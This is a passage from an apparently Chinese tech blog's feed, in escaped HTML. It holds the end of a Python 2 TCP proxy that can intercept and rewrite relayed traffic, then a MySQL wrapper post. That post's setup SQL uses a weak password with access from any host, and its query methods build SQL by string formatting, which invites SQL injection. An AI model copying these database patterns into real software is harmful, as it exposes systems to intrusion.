&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[&amp;lt;==] Sending &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> bytes to localhost.&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> len(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_socket&lt;span style="color:#f92672">.&lt;/span>send(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#现在我们从本地循环读取数据，发送给远程主机和本地主机&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#从本地读取数据&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_buffer &lt;span style="color:#f92672">=&lt;/span> receive_from(client_socket)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(local_buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">[==&amp;gt;] Received &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> bytes from localhost.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> len(local_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># hexdump(local_buffer)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#发送给我们的本地请求&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_buffer &lt;span style="color:#f92672">=&lt;/span> request_handler(local_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#发送给远程主机&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_socket&lt;span style="color:#f92672">.&lt;/span>send(local_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[==&amp;gt;] Sent to remote.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#接收响应的数据&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_buffer &lt;span style="color:#f92672">=&lt;/span> receive_from(remote_socket)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> len(remote_buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">[&amp;lt;==] Received &lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74"> bytes from remote.&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> len(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># hexdump(remote_buffer)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#发送数据到响应处理函数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_buffer &lt;span style="color:#f92672">=&lt;/span> response_handler(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#将响应发送给本地socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_socket&lt;span style="color:#f92672">.&lt;/span>send(remote_buffer)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[==&amp;gt;] Sent to localhost.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#若两边都没有数据，关闭连接&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> len(local_buffer) &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> len(remote_buffer):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_socket&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_socket&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[*] No more data. Closing connections.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">server_loop&lt;/span>(local_host,local_port,remote_host,remote_port,receive_first):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server &lt;span style="color:#f92672">=&lt;/span> socket&lt;span style="color:#f92672">.&lt;/span>socket(socket&lt;span style="color:#f92672">.&lt;/span>AF_INET,socket&lt;span style="color:#f92672">.&lt;/span>SOCK_STREAM)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server&lt;span style="color:#f92672">.&lt;/span>bind((local_host,local_port))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[!!] Failed to listen on &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (local_host,local_port)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[!!] Check for other listening sockets or correct permisssions.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sys&lt;span style="color:#f92672">.&lt;/span>exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;[*] Listening on &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">......&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (local_host,local_port)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server&lt;span style="color:#f92672">.&lt;/span>listen(&lt;span style="color:#ae81ff">5&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> client_socket,addr &lt;span style="color:#f92672">=&lt;/span> server&lt;span style="color:#f92672">.&lt;/span>accept()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#打印本地连接信息&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">[==&amp;gt;] Received incoming connection from &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">:&lt;/span>&lt;span style="color:#e6db74">%d&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (addr[&lt;span style="color:#ae81ff">0&lt;/span>],addr[&lt;span style="color:#ae81ff">1&lt;/span>])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#开启一个线程与远程主机通信&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> proxy_thread &lt;span style="color:#f92672">=&lt;/span> threading&lt;span style="color:#f92672">.&lt;/span>Thread(target&lt;span style="color:#f92672">=&lt;/span>proxy_handler,args&lt;span style="color:#f92672">=&lt;/span>(client_socket,remote_host,remote_port,receive_first))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> proxy_thread&lt;span style="color:#f92672">.&lt;/span>start()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span> ():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> optparse&lt;span style="color:#f92672">.&lt;/span>OptionParser()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;--lh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--localhost&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;localhost&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Localhost.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;--lp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--localport&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;localport&amp;#39;&lt;/span>,default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8888&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Localport.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;--rh&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--remotehost&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;remotehost&amp;#39;&lt;/span>, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;127.0.0.1&amp;#39;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Remotehost.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;--rp&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--remoteport&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;remoteport&amp;#39;&lt;/span>, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8080&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> type&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;int&amp;#39;&lt;/span>, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Remoteport.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_option(&lt;span style="color:#e6db74">&amp;#39;--rf&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;--receivefirst&amp;#39;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;receive_first&amp;#39;&lt;/span>, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">False&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> action&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;store_true&amp;#39;&lt;/span>,help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Connection before send and receive data.&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (options, args) &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#设置本地监听参数&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>localhost:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>localhost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>localport:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> local_port &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>localport
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#设置远程目标&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>remotehost:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_host &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>remotehost
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>remoteport:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> remote_port &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>remoteport
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> receive_first &lt;span style="color:#f92672">=&lt;/span> options&lt;span style="color:#f92672">.&lt;/span>receive_first
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># print local_host,local_port,remote_host,remote_port,receive_first&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">#现在设置好我们的监听socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> server_loop(local_host,local_port,remote_host,remote_port,receive_first)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>main()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-效果图">0x02 效果图&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/python_proxy_result.png" alt="效果图">&lt;/p></description></item><item><title>Python 封装 MySQL 类</title><link>https://wyb0.cn/posts/2016/python-package-mysql-function/</link><pubDate>Mon, 12 Sep 2016 22:54:28 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-package-mysql-function/</guid><description>&lt;h3 id="0x00-安装">0x00 安装&lt;/h3>
&lt;p>有两种，一个是MySQLdb，一个是pymysql&lt;/p>
&lt;ul>
&lt;li>下载&lt;a href="https://pypi.python.org/pypi/MySQL-python/1.2.5">MySQL-python&lt;/a>然后安装&lt;/li>
&lt;li>sudo pip install pymysql(推荐，因为py3已经不支持MySQLdb了)&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-简单表设计如下">0x01 简单表设计如下&lt;/h3>
&lt;pre tabindex="0">&lt;code>insert into mysql.user(Host,User,Password) values(&amp;#39;%&amp;#39;,&amp;#39;python&amp;#39;,&amp;#39;123456&amp;#39;);

drop database if exists python;
create database python;
use python;

drop table if exists msg;
create table msg(
 id int not null auto_increment primary key,
 ip varchar(40) not null default &amp;#39;127.0.0.1&amp;#39; comment &amp;#39;ip地址&amp;#39;,
 domain varchar(100) not null default &amp;#39;www.xx.com&amp;#39; comment &amp;#39;域名&amp;#39;
);

grant all privileges on python.* to &amp;#39;python&amp;#39;@&amp;#39;%&amp;#39; identified by &amp;#39;123456&amp;#39;;
flush privileges;
&lt;/code>&lt;/pre>&lt;h3 id="0x02-mysqldb封装代码">0x02 MySQLdb封装代码&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -*- coding: utf-8 -*-&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> MySQLdb
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">mysql&lt;/span>(object):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;docstring for mysql&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self, dbconfig):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>host &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;host&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>port &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;port&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>user &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;user&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>passwd &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;passwd&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>dbname &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;dbname&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>charset &lt;span style="color:#f92672">=&lt;/span> dbconfig[&lt;span style="color:#e6db74">&amp;#39;charset&amp;#39;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_connect()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_cursor &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_conn&lt;span style="color:#f92672">.&lt;/span>cursor()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">_connect&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>_conn &lt;span style="color:#f92672">=&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>connect(host&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>host,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>port,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> user&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>user,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> passwd&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>passwd,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> db&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>dbname,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> charset&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>charset)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>Error,e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">query&lt;/span>(self, sql):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>execute(sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> MySQLdb&lt;span style="color:#f92672">.&lt;/span>Error, e:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> result &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> result
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">select&lt;/span>(self, table, column&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;*&amp;#39;&lt;/span>, condition&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> condition &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39; where &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> condition &lt;span style="color:#66d9ef">if&lt;/span> condition &lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#66d9ef">None&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> condition:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;select &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> from &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (column,table,condition)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;select &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74"> from &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (column,table)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>query(sql)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>_cursor&lt;span style="color:#f92672">.&lt;/span>fetchall()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">insert&lt;/span>(self, table, tdict):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> column &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> key &lt;span style="color:#f92672">in&lt;/span> tdict:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> column &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;,&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> key
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;,&amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> tdict[key]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> column &lt;span style="color:#f92672">=&lt;/span> column[&lt;span style="color:#ae81ff">1&lt;/span>:]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> value &lt;span style="color:#f92672">=&lt;/span> value[&lt;span style="color:#ae81ff">2&lt;/span>:] &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sql &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;insert into &lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">(&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">) values(&lt;/span>&lt;span style="color:#e6db74">%s&lt;/span>&lt;span style="color:#e6db74">)&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> (table,column,value)
